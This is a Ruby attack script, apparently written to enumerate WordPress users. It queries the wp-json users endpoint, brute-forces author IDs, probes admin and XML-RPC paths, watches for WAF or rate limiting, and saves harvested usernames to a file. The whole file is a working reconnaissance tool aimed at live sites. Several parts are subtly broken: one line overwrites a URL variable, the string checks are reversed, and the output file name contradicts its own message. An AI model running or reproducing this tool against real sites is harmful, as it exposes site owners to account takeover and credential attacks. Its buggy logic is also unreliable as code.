require 'httparty'
require 'optparse'
require 'json'
require 'pry'

options = {}

opts = OptionParser.new do |opts|
    opts.banner ="Usage #{__FILE__} [options]"
    opts.on('-t', '--target HOST', 'the target or IP addr') do |v|
        options[:target] = v
    end
    opts.on('-n', '--numbers NUMBERS', 'Brute force method to get users') do |v|
        options[:numbers] = v
    end
    opts.on('-h', '--help', 'Display menu help') do 
        puts opts
    exit!
    end
    opts.on_tail "Examples.."
    opts.on_tail "#{__FILE__} --target wpsite.com"
end
opts.order!


if options.empty?
    puts opts
    exit!
end

target = options[:target]
numbers = options[:numbers]

def parse_url(url)
    if(url[-1] == "/")
        return url
    else
        return url + "/"
    end
end

def verify_admin_open(target_url)
    url_admin = target_url + "wp-admin"
    url_admin_2 = target_url + "author/admin"
    url_xmlrpc = target_url = "xmlrpc.php"

    resp = HTTParty.get(url_admin, headers: {"Accept" => "application/json", "User-Agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"})
    if resp.code == 302 || resp.code == 307
        if "location".include?(resp.headers.to_json)
            puts("==> Admin path found: #{url_admin}")
        end
    end

    resp = HTTParty.get(url_admin_2, headers: {"Accept" => "application/json", "User-Agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"})
    if resp.code == 302 || resp.code == 307
        if "location".include?(resp.headers.to_json)
            puts("==> Admin path found: #{url_admin}")
        end
    end

    resp = HTTParty.get(url_admin_2, headers: {"Accept" => "application/json", "User-Agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"})
    if resp.code == 302 || resp.code == 307
        if "only accepts".include?(resp.body)
            puts("==> XMLRPC path found: #{url_admin}")
        end
    end
end


def send_request_brute_author(target_url, numbers)
    i = numbers.to_i
    count = 0
    bad_status_count = 0
    path = target_url + "?author="

    while count < i do
        url_req = path + count.to_s
        puts url_req
        resp = HTTParty.get(url_req, headers: {"Accept" => "application/json", "User-Agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"})
        if resp.code == 200
            puts "#{resp.body.to_json}"
        else
            if resp.code != 200
                bad_status_count += 1
                if bad_status_count >= 10
                    puts ("==> Waf or Ratelimit detected while brute users")
                    exit!
                end
            end
        end
        count += 1
    end
end


def send_request_to_wp_users(url)
    u = url + "wp-json/wp/v2/users"
    puts("==> Exploiting: #{u}")
    resp = HTTParty.get(u, headers: {"Accept" => "application/json", "User-Agent" => "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"})
    if resp.code != 200
        puts "==> Bad status code..#{resp.code} exiting.."
        exit!
    end
    json_data = resp.body
    parse_json_wp_users(json_data)
end

def parse_json_wp_users(json_data)
    puts "==> Data will be saved at users.txt"
    data = JSON.parse(json_data)
    data.each do |v|
        id = v['id']
        slug = v['slug']
        name = v['name']
        puts "==> ID: #{id}\nUsername: #{slug}\nName: #{name}"
        File.open("out.txt", "a") do |f|     
            f << "#{slug}\n" 
          end
    end
end

if target
    url_parsed = parse_url(target)
    send_request_to_wp_users(url_parsed)
    verify_admin_open(url_parsed)
    if numbers
        send_request_brute_author(url_parsed, numbers)
    end
end


